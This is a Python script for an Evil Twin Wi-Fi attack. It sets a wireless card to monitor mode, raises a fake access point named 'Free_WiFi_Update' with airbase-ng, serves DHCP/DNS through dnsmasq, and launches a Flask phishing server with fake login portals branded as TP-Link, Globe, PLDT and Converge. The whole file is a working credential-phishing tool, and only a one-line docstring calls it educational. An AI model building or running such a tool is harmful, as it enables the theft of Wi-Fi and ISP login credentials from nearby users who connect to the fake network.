import os
import time
import subprocess
import socket
from rich.console import Console
from rich.prompt import Prompt
from rich.panel import Panel

console = Console()

def get_local_ip() -> str:
    """Get the local IP address for the phishing server bridge."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("10.255.255.255", 1))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "10.0.0.1"

def start_fake_ap(interface: str) -> None:
    """
    Launch a fake access point (Evil Twin) and start the phishing server.
    This function sets up monitor mode, launches airbase-ng, configures a bridge,
    starts dnsmasq, and launches a Flask phishing server with ISP-themed portals.
    Security Warning: This attack is for educational and authorized testing only.
    """
    ssid = Prompt.ask("[cyan]Enter fake SSID name", default="Free_WiFi_Update")
    channel = Prompt.ask("[cyan]Enter channel", default="6")
    console.print(Panel(f"[bold green]Launching Fake AP: {ssid} on channel {channel}[/]"))

    # Set interface to monitor mode and channel
    os.system(f"sudo ip link set {interface} down")
    os.system(f"sudo iw dev {interface} set type monitor")
    os.system(f"sudo ip link set {interface} up")
    os.system(f"sudo iwconfig {interface} channel {channel}")

    # Start airbase-ng for the fake AP
    os.system(f"sudo pkill airbase-ng")
    os.system(f"sudo airbase-ng -e \"{ssid}\" -c {channel} {interface} > /dev/null 2>&1 &")
    time.sleep(5)

    # Create bridge and assign IP
    os.system("sudo pkill dnsmasq")
    os.system("sudo ip link add name br0 type bridge")
    os.system("sudo ip link set br0 up")
    os.system("sudo ip link set at0 master br0")
    os.system("sudo ip addr add 10.0.0.1/24 dev br0")

    # Start dnsmasq for DHCP/DNS
    os.system("sudo dnsmasq -C dnsmasq.conf")

    # ISP phishing portal selection
    isp_map = {
        "1": "tplink",
        "2": "globe",
        "3": "pldt",
        "4": "converge"
    }

    console.print(Panel(
        "[bold cyan]🌐 Select ISP Login Theme:[/]\n"
        "[1] TP-Link\n"
        "[2] Globe\n"
        "[3] PLDT\n"
        "[4] Converge"
    ))
    brand_choice = Prompt.ask("Enter choice [1/2/3/4]", choices=list(isp_map.keys()), default="1")
    selected_brand = isp_map[brand_choice]

    local_ip = get_local_ip()
    console.print(Panel.fit(
        f"[bold yellow]📡 Phishing server at:[/] [green]http://{local_ip}[/]\n"
        f"[bold cyan]Theme:[/] {selected_brand.capitalize()} — [green]http://{local_ip}/?brand={selected_brand}[/]",
        title="Phishing Portal Info",
        border_style="cyan"
    ))

    # Start the phishing server (Flask app)
    subprocess.Popen(["sudo", "python3", "phish_server.py"])

    try:
        console.print("[bold green]💀 Fake AP is running. Press CTRL+C to stop everything.[/]")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # Cleanup all services and bridge
        os.system("sudo pkill airbase-ng")
        os.system("sudo pkill dnsmasq")
        os.system("sudo pkill python3")
        os.system("sudo iptables -t nat -F")
        os.system("sudo ip link set br0 down")
        os.system("sudo ip link delete br0")
        console.print("[bold red]⛔ All services stopped.[/]")
